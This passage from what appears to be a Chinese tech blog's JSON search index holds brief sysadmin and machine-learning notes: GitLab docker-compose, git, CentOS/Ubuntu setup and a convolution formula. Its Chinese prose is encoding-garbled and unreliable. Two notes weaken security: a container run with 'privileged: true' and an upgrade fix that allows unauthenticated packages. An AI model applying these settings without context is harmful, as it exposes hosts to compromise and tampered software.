&apos;gitlab/gitlab-ce:11.0.1-ce.0&apos; restart: always container_name: gitlab privileged: true hostname: &apos;xxx.com&apos; environment: GITLAB_OMNIBUS_CONFIG: | # Add any other gitlab.rb configuration here, each on its own line unicorn[&apos;worker_timeout&apos;] = 120 unicorn[&apos;worker_processes&apos;] = 8 ports: - &apos;4080:80&apos; - &apos;4443:443&apos; - &apos;4022:22&apos; volumes: - &apos;/etc/gitlab:/etc/gitlab&apos; - &apos;/var/log/gitlab:/var/log/gitlab&apos; - &apos;/data/gitlab:/var/opt/gitlab&apos;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"docker å®¹å™¨è·å–ä¸»æœºæƒé™","slug":"history/tech/5b31dfbe5bf8e4f86e557e1c","date":"2018-06-25T18:39:58.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5b31dfbe5bf8e4f86e557e1c/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b31dfbe5bf8e4f86e557e1c/","excerpt":"","text":"æ·»åŠ ä»¥ä¸‹é…ç½®ï¼š1privileged: truegitlab docker-compose æ–‡ä»¶å¦‚ä¸‹ï¼š12345678910111213141516gitlab: image: &apos;gitlab/gitlab-ce:11.0.1-ce.0&apos; restart: always container_name: gitlab privileged: true environment: GITLAB_OMNIBUS_CONFIG: | # Add any other gitlab.rb configuration here, each on its own line ports: - &apos;3080:80&apos; - &apos;3443:443&apos; - &apos;3022:22&apos; volumes: - &apos;/etc/gitlab:/etc/gitlab&apos; - &apos;/var/log/gitlab:/var/log/gitlab&apos; - &apos;/data/gitlab/:/var/opt/gitlab&apos;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"cdh ä¸‹è½½åœ°å€","slug":"history/tech/5b31ca2a5bf8e4f86e557e1b","date":"2018-06-25T17:07:54.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5b31ca2a5bf8e4f86e557e1b/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b31ca2a5bf8e4f86e557e1b/","excerpt":"","text":"http://archive.cloudera.com/cdh5/cdh/5/","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"emule è¿æ¥ç½‘ç»œ","slug":"history/tech/5b309e5e5bf8e4f86e557e1a","date":"2018-06-24T19:48:46.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5b309e5e5bf8e4f86e557e1a/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b309e5e5bf8e4f86e557e1a/","excerpt":"","text":"ed2kåœ¨ç”µéª¡æœåŠ¡å™¨ç•Œé¢å³è¾¹çš„ ä»URLæ›´æ–°server.met å­—æ ·ä¸‹è¾¹çš„å°æ¡†é‡Œè¾“å…¥ http://upd.emule-security.org/server.metï¼Œç„¶åç‚¹å‡»æ›´æ–° kadå°†ä¸‹é¢çš„ä¸‰ä¸ªHTTPåœ°å€ä¹‹ä¸€åŠ å…¥åˆ°eMuleè½¯ä»¶ ä»ä»¥ä¸‹ç½‘å€è·å–èŠ‚ç‚¹ä¿¡æ¯ ä¸­123http://upd.emule-security.org/nodes.dathttp://kademlia.ru/download/nodes.dathttp://sn.im/nodes.dat","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"å·ç§¯è®¡ç®—å…¬å¼","slug":"history/tech/5b2b59685bf8e4f86e557e19","date":"2018-06-20T19:53:12.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5b2b59685bf8e4f86e557e19/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b2b59685bf8e4f86e557e19/","excerpt":"","text":"å…¨é›¶å¡«å……æ—¶å°ºå¯¸=å…¥é•¿/æ­¥é•¿ï¼›éå…¨é›¶å¡«å……æ—¶å°ºå¯¸=ï¼ˆå…¥é•¿-æ ¸é•¿+1ï¼‰/æ­¥é•¿123456è¾“å‡ºå›¾ç‰‡è¾¹é•¿=ï¼ˆè¾“å…¥å›¾ç‰‡è¾¹é•¿â€“å·ç§¯æ ¸é•¿+1ï¼‰/æ­¥é•¿è¾“å‡ºæ•°æ®ä½“çš„å°ºå¯¸=(Wâˆ’F+2P)/S+1Wï¼šè¾“å…¥æ•°æ®ä½“å°ºå¯¸Fï¼šå·ç§¯å±‚ä¸­ç¥ç»å…ƒæ„ŸçŸ¥åŸŸSï¼šæ­¥é•¿ï¼ŒPï¼šé›¶å¡«å……çš„æ•°é‡å°†ä¸€å¼ 3232å¤§å°çš„å›¾ç‰‡è¾“å…¥ä¸€ä¸ªå·ç§¯ç¥ç»ç½‘ç»œï¼Œç»è¿‡ä¸€å±‚å·ç§¯å±‚ï¼ˆå·ç§¯æ ¸å¤§å°ä¸º55ï¼Œæ­¥é•¿ä¸º1ï¼Œéå…¨é›¶å¡«å……ï¼‰å’Œä¸€å±‚æ± åŒ–å±‚ï¼ˆæ± åŒ–æ ¸å¤§å°ä¸º2*2ï¼Œæ­¥é•¿ä¸º2ï¼Œå…¨é›¶å¡«å……ï¼‰ä¹‹åè¾“å‡ºçš„å›¾ç‰‡å°ºå¯¸ä¸ºå¤šå°‘ï¼Ÿ114","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"å´æ©è¾¾æœ€æ–°è¯¾ç¨‹","slug":"history/tech/5b2b32ae5bf8e4f86e557e18","date":"2018-06-20T17:07:58.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5b2b32ae5bf8e4f86e557e18/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b2b32ae5bf8e4f86e557e18/","excerpt":"","text":"https://web.stanford.edu/class/cs230/","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"git ä»è¿œç¨‹ä»“åº“è·å–æ‰€æœ‰åˆ†æ”¯","slug":"history/tech/5b2a055a5bf8e4f86e557e17","date":"2018-06-19T19:42:18.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5b2a055a5bf8e4f86e557e17/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b2a055a5bf8e4f86e557e17/","excerpt":"","text":"123git branch -r | grep -v &apos;\\-&gt;&apos; | while read remote; do git branch --track &quot;$&#123;remote#origin/&#125;&quot; &quot;$remote&quot;; donegit fetch --allgit pull --all","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"å¾®ä¿¡å°ç¨‹åºè®¾ç½®åœ°å›¾æ»¡å±æ¨¡å¼","slug":"history/tech/5b287c315bf8e4f86e557e16","date":"2018-06-19T03:44:49.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5b287c315bf8e4f86e557e16/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b287c315bf8e4f86e557e16/","excerpt":"","text":"åœ¨å¯¹åœ°å›¾è¿›è¡Œæ§åˆ¶æ˜¾ç¤ºåŒºåŸŸå¤§å°æ—¶æƒ³å°†åœ°å›¾å…¨å±æ˜¾ç¤ºåœ¨æ‰‹æœºä¸Šï¼Œä½¿ç”¨å¹³æ—¶çš„pxæˆ–è€…ç›´æ¥ä½¿ç”¨ç™¾åˆ†æ¯”å¯¹äºé«˜åº¦å…¨å±æ— æ•ˆï¼Œè¿™æ—¶å€™å¯ä»¥é€šè¿‡vhè¿™ä¸ªå•ä½ï¼Œæ•´ä¸ªå±å¹•é»˜è®¤æ»¡å±ä¸º100vh;æ‰€ä»¥å°†åœ°å›¾çš„é«˜åº¦è®¾ç½®ä¸º100vhå®½åº¦è®¾ç½®ä¸º100%ï¼Œå°±å¯ä»¥ï¼123&lt;view style=&quot;width: &#123;&#123; windowWidth &#125;&#125;px;height: &#123;&#123;windowHeight&#125;&#125;px;&quot;&gt; &lt;map id=&quot;myMap&quot; longitude=&quot;&#123;&#123;longitude&#125;&#125;&quot; latitude=&quot;&#123;&#123;latitude&#125;&#125;&quot; scale=&quot;14&quot; controls=&quot;&#123;&#123;controls&#125;&#125;&quot; bindcontroltap=&quot;controltap&quot; markers=&quot;&#123;&#123;markers&#125;&#125;&quot; bindmarkertap=&quot;markertap&quot; polyline=&quot;&#123;&#123;polyline&#125;&#125;&quot; bindregionchange=&quot;regionchange&quot; show-location=&quot;True&quot; style=&quot;width: 100%;height:100vh;&quot;&gt;&lt;/map&gt;&lt;/view&gt;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"baipeng"},{"title":"No module named SimpleHTTPServer","slug":"history/tech/5b2247189143f2d7465f2ee6","date":"2018-06-13T22:44:40.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5b2247189143f2d7465f2ee6/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b2247189143f2d7465f2ee6/","excerpt":"","text":"ä½¿ç”¨ SimpleHTTPServer:1python -m SimpleHTTPServeræŠ¥é”™ï¼š1No module named SimpleHTTPServerè§£å†³ï¼š1python.exe -m http.server","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ä¿®æ”¹ keras backend","slug":"history/tech/5b1f9b929143f2d7465f2ee5","date":"2018-06-11T22:08:18.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5b1f9b929143f2d7465f2ee5/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b1f9b929143f2d7465f2ee5/","excerpt":"","text":"é…ç½®æ–‡ä»¶è·¯å¾„ï¼š1~/.keras/keras.jsonä¸´æ—¶æ–¹æ¡ˆ:1KERAS_BACKEND=theanoä»£ç æ–¹æ¡ˆ:12import osos.environ[&apos;KERAS_BACKEND&apos;] = &apos;theano&apos;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ai ç«™é›†åˆ","slug":"history/tech/5b1f8a7e9143f2d7465f2ee4","date":"2018-06-11T20:55:26.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5b1f8a7e9143f2d7465f2ee4/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b1f8a7e9143f2d7465f2ee4/","excerpt":"","text":"http://www.fast.aihttps://morvanzhou.github.io/about/http://sofasofa.io/https://blog.coast.ai","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"è§†é¢‘åˆ†ç±»","slug":"history/tech/5b1f890c9143f2d7465f2ee3","date":"2018-06-11T20:49:16.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5b1f890c9143f2d7465f2ee3/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b1f890c9143f2d7465f2ee3/","excerpt":"","text":"kears ä¸­æ–‡æ–‡æ¡£ï¼šhttp://keras-cn.readthedocs.io/en/latest/youtube 8M æ•°æ®é›†https://research.google.com/youtube8m/UCF 101 æ•°æ®é›†http://crcv.ucf.edu/data/UCF101.php","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"åˆ†å¸ƒå¼äº‹åŠ¡è§£å†³æ–¹æ¡ˆ","slug":"history/tech/5b1f633f9143f2d7465f2ee2","date":"2018-06-11T18:07:59.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5b1f633f9143f2d7465f2ee2/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b1f633f9143f2d7465f2ee2/","excerpt":"","text":"è¡¥å¿æ–¹æ¡ˆï¼štcc soga ä¸šåŠ¡è¡¥å¿ mysql:5.7 xa å‚è€ƒèµ„æ–™ï¼šhttps://www.cnblogs.com/luoyunfei99/articles/6803682.htmlhttps://github.com/changmingxie/tcc-transactionhttps://servicecomb.incubator.apache.org/cn/docs/distributed-transactions-saga-implementation/https://github.com/ServiceComb","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"å®‰è£… pm2-web æç¤ºç¼ºå°‘  dns_sd.h","slug":"history/tech/5b1e37fa9143f2d7465f2ee1","date":"2018-06-10T20:51:06.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5b1e37fa9143f2d7465f2ee1/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b1e37fa9143f2d7465f2ee1/","excerpt":"","text":"æŠ¥é”™ä¿¡æ¯ï¼š1fatal error: dns_sd.h: No such file or directoryè§£å†³ï¼š1sudo apt-get install libavahi-compat-libdnssd-dev","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ubuntu 14.04 å‡çº§åˆ° 16.04 curl æŠ¥é”™","slug":"history/tech/5b14f3df33380aa24f1fc286","date":"2018-06-03T20:10:07.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5b14f3df33380aa24f1fc286/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b14f3df33380aa24f1fc286/","excerpt":"","text":"ubuntu 14.04 å‡çº§åˆ° 16.04 curl æŠ¥é”™12345root@test:~# curlcurl: error while loading shared libraries: librtmp.so.0: cannot open shared object file: No such file or directoryroot@test:~# sudo ln -s /usr/lib/x86_64-linux-gnu/librtmp.so.1 /usr/lib/x86_64-linux-gnu/librtmp.so.0root@test:~# curlcurl: try 'curl --help' or 'curl --manual' for more information","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"centos å®‰è£… python3","slug":"history/tech/5b12c63933380aa24f1fc282","date":"2018-06-03T04:30:49.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5b12c63933380aa24f1fc282/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b12c63933380aa24f1fc282/","excerpt":"","text":"é¦–å…ˆå®‰è£…ä¾èµ–åŒ…12yum -y groupinstall &quot;Development tools&quot;yum -y install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gdbm-devel db4-devel libpcap-devel xz-develä¸‹è½½ï¼š1https://www.python.org/ftp/python/ç¼–è¯‘ï¼š1234tar -xvJf Python-3.6.5.tar.xzcd Python-3.6.5./configure --prefix=/usr/local/python/python3make &amp;&amp; make installè½¯è¿æ¥:12ln -s /usr/local/python/python3/bin/python3 /usr/bin/python3ln -s /usr/local/python/python3/bin/pip3 /usr/bin/pip3","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"centos7 å®‰è£… htop","slug":"history/tech/5b12c4f533380aa24f1fc281","date":"2018-06-03T04:25:25.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5b12c4f533380aa24f1fc281/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b12c4f533380aa24f1fc281/","excerpt":"","text":"12yum -y install epel-releaseyum -y install htopå¸¸ç”¨åŠŸèƒ½ï¼šF1 : æŸ¥çœ‹htopä½¿ç”¨è¯´æ˜ F2 : è®¾ç½® F3 : æœç´¢è¿›ç¨‹ F4 : è¿‡æ»¤å™¨ï¼ŒæŒ‰å…³é”®å­—æœç´¢ F5 : æ˜¾ç¤ºæ ‘å½¢ç»“æ„ F6 : é€‰æ‹©æ’åºæ–¹å¼ F7 : å‡å°‘niceå€¼ï¼Œè¿™æ ·å°±å¯ä»¥æé«˜å¯¹åº”è¿›ç¨‹çš„ä¼˜å…ˆçº§ F8 : å¢åŠ niceå€¼ï¼Œè¿™æ ·å¯ä»¥é™ä½å¯¹åº”è¿›ç¨‹çš„ä¼˜å…ˆçº§ F9 : æ€æ‰é€‰ä¸­çš„è¿›ç¨‹ F10 : é€€å‡ºhtop / : æœç´¢å­—ç¬¦ h : æ˜¾ç¤ºå¸®åŠ© l ï¼šæ˜¾ç¤ºè¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶: å¦‚æœå®‰è£…äº†lsofï¼ŒæŒ‰æ­¤é”®å¯ä»¥æ˜¾ç¤ºè¿›ç¨‹æ‰€æ‰“å¼€çš„æ–‡ä»¶ u ï¼šæ˜¾ç¤ºæ‰€æœ‰ç”¨æˆ·ï¼Œå¹¶å¯ä»¥é€‰æ‹©æŸä¸€ç‰¹å®šç”¨æˆ·çš„è¿›ç¨‹ s : å°†è°ƒç”¨straceè¿½è¸ªè¿›ç¨‹çš„ç³»ç»Ÿè°ƒç”¨ t : æ˜¾ç¤ºæ ‘å½¢ç»“æ„ H ï¼šæ˜¾ç¤º/éšè—ç”¨æˆ·çº¿ç¨‹ I ï¼šå€’è½¬æ’åºé¡ºåº K ï¼šæ˜¾ç¤º/éšè—å†…æ ¸çº¿ç¨‹ M ï¼šæŒ‰å†…å­˜å ç”¨æ’åº P ï¼šæŒ‰CPUæ’åº T ï¼šæŒ‰è¿è¡Œæ—¶é—´æ’åº ä¸Šä¸‹é”®æˆ–PgUP, PgDn : ç§»åŠ¨é€‰ä¸­è¿›ç¨‹ å·¦å³é”®æˆ–Home, End : ç§»åŠ¨åˆ—è¡¨ Space(ç©ºæ ¼) : æ ‡è®°/å–æ¶ˆæ ‡è®°ä¸€ä¸ªè¿›ç¨‹ã€‚å‘½ä»¤å¯ä»¥ä½œç”¨äºå¤šä¸ªè¿›ç¨‹ï¼Œä¾‹å¦‚ &quot;kill&quot;ï¼Œå°†åº”ç”¨äºæ‰€æœ‰å·²æ ‡è®°çš„è¿›ç¨‹","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"centos7ä¸Šä½¿ç”¨systemdå¯åŠ¨supervisor","slug":"history/tech/5b132db733380aa24f1fc284","date":"2018-06-02T23:52:23.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5b132db733380aa24f1fc284/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b132db733380aa24f1fc284/","excerpt":"","text":"æ·»åŠ æ–‡ä»¶:123456789101112131415vim /usr/lib/systemd/system/supervisord.service[Unit]Description=Supervisor daemon[Service]Type=forkingExecStart=/usr/bin/supervisord -c /etc/supervisord.confExecStop=/usr/bin/supervisorctl $OPTIONS shutdownExecReload=/usr/bin/supervisorctl $OPTIONS reloadKillMode=processRestart=on-failureRestartSec=42s[Install]WantedBy=multi-user.targetæ¿€æ´» &amp; å¯åŠ¨ï¼š12systemctl enable supervisord.servicesystemctl start supervisord.serviceå¦‚æœä¿®æ”¹äº†æ–‡ä»¶ï¼Œå¯ä»¥é€šè¿‡reloadå‘½ä»¤æ¥é‡æ–°åŠ è½½ supervisord.service æ–‡ä»¶1systemctl reload supervisord.service","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"centos7 å®‰è£… pip","slug":"history/tech/5b132d2b33380aa24f1fc283","date":"2018-06-02T23:50:03.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5b132d2b33380aa24f1fc283/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b132d2b33380aa24f1fc283/","excerpt":"","text":"1yum -y install epel-release1yum -y install python-pip","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"git æ”¾å¼ƒæœ¬åœ°ä¿®æ”¹ å¼ºåˆ¶æ›´æ–°","slug":"history/tech/5b139c8a33380aa24f1fc285","date":"2018-06-02T19:45:14.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5b139c8a33380aa24f1fc285/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b139c8a33380aa24f1fc285/","excerpt":"","text":"git fetch ä¸‹è½½è¿œç¨‹çš„åº“çš„å†…å®¹, git reset æŠŠHEADæŒ‡å‘åˆšåˆšä¸‹è½½çš„æœ€æ–°çš„ç‰ˆæœ¬12git fetch --allgit reset --hard origin/master","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"Centos7å®‰è£…å®Œæ¯•åæ— æ³•è”ç½‘","slug":"history/tech/5b12ad2d33380aa24f1fc280","date":"2018-06-02T02:43:57.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5b12ad2d33380aa24f1fc280/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b12ad2d33380aa24f1fc280/","excerpt":"","text":"æœ€åä¸€è¡Œæ”¹ä¸º ONBOOT=YES123cd /etc/sysconfig/network-scripts/ vi ifcfg-xxx ONBOOT=YESé‡å¯ network:1service network restart","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"Error authenticating some packages while upgrade","slug":"history/tech/5b12a9e833380aa24f1fc27f","date":"2018-06-02T02:30:00.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5b12a9e833380aa24f1fc27f/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b12a9e833380aa24f1fc27f/","excerpt":"","text":"ubuntu 14.04 do-release-upgrade, æŠ¥é”™ï¼š1Error authenticating some packages while upgradeè§£å†³æ–¹æ¡ˆ:123vim /etc/update-manager/release-upgrades.d/unauth.cfg[Distro]AllowUnauthenticated=yeså®‰è£…å®Œæˆååˆ é™¤æ­¤æ–‡ä»¶å³å¯ã€‚å‚è€ƒèµ„æ–™:https://askubuntu.com/questions/425355/error-authenticating-some-packages-while-upgrade","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ubuntu 16.04 å®‰è£… tensorflow","slug":"history/tech/5b129cac33380aa24f1fc27e","date":"2018-06-02T01:33:32.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5b129cac33380aa24f1fc27e/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b129cac33380aa24f1fc27e/","excerpt":"","text":"ç³»ç»Ÿç‰ˆæœ¬ï¼š12root@xxxx:~# cat /etc/issueUbuntu 16.04.1 LTS \\n \\lç¯å¢ƒå‡†å¤‡:123apt-get install python3-setuptoolsapt-get install python-pkg-resources=3.3-1ubuntu1python -m pip install --upgrade --force-reinstall pipå®‰è£… tensorflow:1pip install 